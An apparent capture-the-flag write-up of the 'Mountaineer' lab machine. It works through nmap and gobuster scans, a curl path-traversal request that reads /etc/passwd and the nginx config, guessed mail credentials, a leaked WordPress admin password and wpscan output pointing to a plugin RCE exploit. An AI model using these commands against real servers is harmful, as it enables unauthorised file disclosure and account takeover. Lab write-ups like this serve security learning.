recon and enumuration 
here first we conduct a nmap scan and to found out what are the open ports 
```
nmap -sS -p- -T4 10.49.151.94 -oN open-ports.txt
# Nmap 7.98 scan initiated Wed Apr 15 17:52:36 2026 as: /usr/lib/nmap/nmap -sS -p- -T4 -oN open-ports.txt 10.48.134.145
Nmap scan report for 10.48.134.145
Host is up (0.047s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Wed Apr 15 17:54:33 2026 -- 1 IP address (1 host up) scanned in 117.81 seconds

```
 port 80 is open,i check and have nginx welcome page by default after i try directory bruteforce to find out hidden pages and something intresting,after bit of time  i fount a directory wordpress
 that's mean website hosted on wordpress ,but first we need to change our /etc/hosts configuration so website work,it's used virtual hosting somthing they need in hostheader mountaineer.thm
 lets change it and 
 ```bash
nano  /etc/hosts
10.49.151.94  mountaineer.thm
```

<img width="1907" height="870" alt="blog" src="https://github.com/user-attachments/assets/295f1728-6686-469c-84bf-29073bd34315" />

```
7:11] root@prime ~/ctf/mountain # gobuster dir -u http://mountaineer.thm/wordpress -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt   
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mountaineer.thm/wordpress
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/images/]
wp-content           (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-content/]
wp-includes          (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-includes/]
wp-admin             (Status: 301) [Size: 178] [--> http://mountaineer.thm/wordpress/wp-admin/]
```

i try bruteforce on wp-admin and i failled so badly it took my so much time so i decided to explore images and othe directories,at images have a path traversal so we can read a /etc/passwd file and server important configuration files

```
[7:48] root@prime ~/ctf/mountain # curl http://mountaineer.thm/wordpress/images../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant:/home/vagrant:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
vboxadd:x:998:1::/var/run/vboxadd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
dovecot:x:115:121:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:116:122:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
manaslu:x:1002:1002::/home/manaslu:/bin/bash
annapurna:x:1003:1003::/home/annapurna:/bin/bash
makalu:x:1004:1004::/home/makalu:/bin/bash
kangchenjunga:x:1006:1006::/home/kangchenjunga:/bin/bash
postfix:x:117:123::/var/spool/postfix:/usr/sbin/nologin
everest:x:1010:1010::/home/everest:/bin/bash
lhotse:x:1011:1011::/home/lhotse:/bin/bash
nanga:x:1012:1012::/home/nanga:/bin/bash
k2:x:1013:1013::/home/k2:/bin/bash
```


we know the server is a nginx so we try to enumurate nginx default files and configuration

| File / Path                      | Purpose                                   | Security Relevance                           | What to Check (Pentesting View)                                                        |
| -------------------------------- | ----------------------------------------- | -------------------------------------------- | -------------------------------------------------------------------------------------- |
| `/etc/nginx/nginx.conf`          | Main global config file                   | Controls overall behavior of server          | Check for: `user`, `worker_processes`, `include` directives, security headers, logging |
| `/etc/nginx/conf.d/*.conf`       | Additional config files (modular configs) | Often contains virtual hosts or custom rules | Look for exposed endpoints, misconfigurations, weak access controls                    |
| `/etc/nginx/sites-available/`    | Stores all site configs                   | Contains full server block definitions       | Check inactive configs → may reveal hidden domains or endpoints                        |
| `/etc/nginx/sites-enabled/`      | Active sites (symlinked)                  | Actually used configs                        | Focus here for attack surface (real targets)                                           |
| `/etc/nginx/snippets/`           | Reusable config snippets                  | Security rules often stored here             | Look for reused insecure configs (e.g., weak SSL, bad headers)                         |
| `/var/log/nginx/access.log`      | Logs all requests                         | Useful for detection & recon                 | Check for sensitive data leakage, tokens, API keys                                     |
| `/var/log/nginx/error.log`       | Logs server errors                        | May leak internal paths or stack traces      | Look for file paths, backend errors, misconfig clues                                   |
| `/usr/share/nginx/html/`         | Default web root                          | Static files served                          | Check for exposed files, backups, `.git`, config leaks                                 |
| `/etc/nginx/mime.types`          | Defines file types                        | Controls how files are served                | Misconfig → file upload bypass (e.g., PHP served as text)                              |
| `/etc/nginx/fastcgi_params`      | Parameters for PHP-FPM                    | Backend communication                        | Check for parameter injection or misrouting                                            |
| `/etc/nginx/proxy_params`        | Reverse proxy settings                    | Used when proxying to backend                | Header manipulation issues (`X-Forwarded-*`)                                           |
| `/etc/nginx/uwsgi_params`        | For Python apps (uWSGI)                   | Backend integration                          | Check for insecure backend exposure                                                    |
| `/etc/nginx/koi-utf` / `koi-win` | Charset maps                              | Encoding configs                             | Rarely critical, but encoding bugs can be abused                                       |
| `/etc/nginx/scgi_params`         | For SCGI protocol                         | Backend config                               | Similar to FastCGI risks                                                               |


                                                             
we fountintresting on /etc/nginx/sites-available/default,it's store all site configuration and also for subdomains,we found a subdomain 

```bash

                                                                                                                                                                                                                 
[7:54] root@prime ~/ctf/mountain # curl http://mountaineer.thm/wordpress/images../etc/nginx/sites-available/default 
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name mountaineer.thm adminroundcubemail.mountaineer.thm;
        client_max_body_size 20M;
        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/www/html;


```

so first add   adminroundcubemail.mountaineer.thm; in  /etc/hosts so we access this virtual subdomain ,like this one
```
                                                                                                                                                                                             
[8:01] root@prime ~/ctf/mountain # cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       prime
10.49.151.94   mountaineer.thm  adminroundcubemail.mountaineer.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

after doing this stuff i access and we get a login page,so  i try bruteforce and on found username from /etc/passwd ,and username:k2 and password:k2 works and we get

<img width="1918" height="912" alt="image" src="https://github.com/user-attachments/assets/da60e366-6654-47cc-a9c4-6b4f28a82a9f" />

<img width="1916" height="997" alt="image" src="https://github.com/user-attachments/assets/97e1e664-d446-486f-977e-22d86c29d197" />

we have a password in second mail,so i tried on /wp-admin th3_tall3st_password_in_th3_world and it's work now we have admin access on worpress site


and i also run a wpscan on wordpress,and it's hase a vulnerablity to upload a remote file which tirgger rce on remote server and little bit google search i found a exploit ,cve:CVE-2021-24145 and github url:https://github.com/dnr6419/CVE-2021-24145/tree/main

```bash
rootme:-->wpscan --url http://mountaineer.thm/wordpress/ -e ap,cb,u,dbe --detection-mode aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://mountaineer.thm/wordpress/ [10.49.189.79]
[+] Started: Fri Apr 17 18:51:53 2026

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://mountaineer.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://mountaineer.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://mountaineer.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/?feed=atom, <generator uri="https://wordpress.org/" version="6.4.3">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-admin/load-styles.php, Match: '6.4.3'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] modern-events-calendar-lite
 | Location: http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/
 | Last Updated: 2022-05-10T21:06:00.000Z
 | [!] The version is out of date, the latest version is 6.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.16.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/readme.txt
 | Confirmed By: Change Log (Aggressive Detection)
 |  - http://mountaineer.thm/wordpress/wp-content/plugins/modern-events-calendar-lite/changelog.txt, Match: '5.16.2'

[+] Enumerating Config Backups (via Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <===============> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=====================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Users (via Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] montblanc
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] everest
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] chooyu
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] k2
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr 17 18:52:03 2026
[+] Requests Done: 274
[+] Cached Requests: 6
[+] Data Sent: 76.007 KB
[+] Data Received: 778.441 KB
[+] Memory used: 241.008 MB
[+] Elapsed time: 00:00:09
               
```
